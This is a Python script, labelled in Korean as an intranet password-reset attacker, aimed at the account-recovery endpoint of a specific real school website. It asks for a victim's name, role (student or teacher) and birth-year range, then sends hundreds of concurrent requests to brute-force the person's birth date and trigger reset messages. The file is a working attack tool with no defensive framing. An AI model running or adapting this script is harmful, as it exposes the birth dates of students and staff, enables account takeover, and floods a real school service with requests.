import asyncio
import aiohttp

async def attack(session, name, year, month, day, atype="S", send="sms"):
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.54 Mobile/15E148 Safari/604.1",
        "Origin": "https://hi.hana.hs.kr",
        "DNT": "1",
        "Referer": "https://hi.hana.hs.kr/member/pop_idpw_search.asp",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Sec-GPC": "1"
    }

    data = {
        "memType": atype,     # S P E I O 학생 학부모 교직원 예비신입생 졸업생
        "jname": name,   # 이름 
        "sname": "",
        "birth_year": str(year),   # 년
        "birth_month": str(month),     # 월
        "birth_day": str(day),       # 일
        "sendtype": send      # mail or sms
    }

    async with session.post('https://hi.hana.hs.kr/proc/idpw_proc.asp', headers=headers, data=data) as resp:
        if resp.status == 200:
            t = await resp.text()

            if "정보가 존재하지 않습니다." in t:
                print("[실패]", year, "년", month, "월", day, "일")
                return False

            else:
                print("[성공]", year, "년", month, "월", day, "일!!!!!!!!!!!!!!!!!!!!!!!!!!!")
                return True
            
        else:
            print("Status Not OK!", resp.status)

async def bound_fetch(sem, name, y, m, d, atype, send, session):
    # Getter function with semaphore.
    async with sem:
        try:
            await attack(session, name, y, m, d, atype, send)
        except aiohttp.client_exceptions.ClientConnectorError:
            try:
                await attack(session, name, y, m, d, atype, send)
            except Exception as e:
                print("[에러]", e, "??????????????????")


async def main(name, atype, target):
    session = aiohttp.ClientSession()

    tasks = []
    sem = asyncio.Semaphore(400)

    for year in target:
        for month in range(1, 13):
            for day in range (1, 32):
                task = asyncio.ensure_future(bound_fetch(sem, name, year, month, day, atype, "mail", session))
                tasks.append(task)
        responses = asyncio.gather(*tasks)
        await responses
            

    await session.close()
    return


if __name__ == "__main__":
    print("=== 인트라넷 패스워드 리셋 공격기 ===\n")
    name = input("1. 공격할 사람의 이름을 입력하세요: ")
    atype = input("2. 학생이면 S, 선생이면 E를 입력하세요: ")
    bd_tmp = input("3. 공격할 사람의 생년 범위를 입력하세요 (예: 2006, 2000-2002): ")

    if "-" in bd_tmp:
        target = [i for i in range(int(bd_tmp.split("-")[0]), int(bd_tmp.split("-")[1]) + 1)]
    else:
        target = [bd_tmp]

    asyncio.run(main(name, atype, target))